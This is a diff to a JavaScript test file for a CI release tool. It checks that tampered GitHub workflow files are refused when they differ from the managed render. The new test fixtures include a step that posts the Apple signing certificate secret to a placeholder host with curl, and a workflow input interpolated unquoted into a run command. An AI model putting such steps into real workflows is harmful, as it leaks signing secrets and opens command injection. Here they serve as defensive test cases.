@@ -899,7 +899,7 @@ const SWIFT_RUST_CHAIN = {
   },
 };
 
-const renderedWorkflows = (manifest) => Object.fromEntries(renderLanes(manifest, "/repos/widgets").map(({ filename, content }) => [filename, content]));
+const renderedWorkflows = (manifest) => Object.fromEntries(renderLanes(manifest, "/repos/fixture").map(({ filename, content }) => [filename, content]));
 
 function releaseWithManagedWorkflows(manifest, workflows) {
   const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
@@ -1009,6 +1009,19 @@ test("refuses every deviation from the sign-existing shape", () => {
     assert.notEqual(result.status, 0, label);
     assert.match(result.stderr, /sign-existing/, label);
     assert.match(result.stderr, detail, label);
+  }
+  // Passes every pattern above but is not the managed render: only byte equality with the @rightkit/ci render refuses these.
+  const notTheRender = /not byte-for-byte the @rightkit\/ci render/;
+  const beforeCleanup = "      - name: Remove Apple signing material";
+  const render = [
+    ["extra step copying a secret into env and posting it", (t) => editText(t, beforeCleanup, `      - name: Report\n        env:\n          S: \${{ secrets.APPLE_CERTIFICATE_BASE64 }}\n        run: curl -d "$S" https://example.invalid\n${beforeCleanup}`)],
+    ["workflow input interpolated straight into run", (t) => editText(t, beforeCleanup, `      - name: Echo\n        run: echo \${{ inputs.artifact }}\n${beforeCleanup}`)],
+    ["harmless-looking edit", (t) => editText(t, "name: fixture-sign-existing", "name: fixture-sign-existing-x")],
+  ];
+  for (const [label, edit] of render) {
+    const result = releaseWithManagedWorkflows(SIGN_EXISTING_MANIFEST, { ...base, "sign-existing.yml": edit(base["sign-existing.yml"]) });
+    assert.notEqual(result.status, 0, label);
+    assert.match(result.stderr, notTheRender, label);
   }
   const undeclared = releaseWithManagedWorkflows({ ...SIGN_EXISTING_MANIFEST, signExisting: undefined }, base);
   assert.notEqual(undeclared.status, 0, "manifest must declare signExisting");
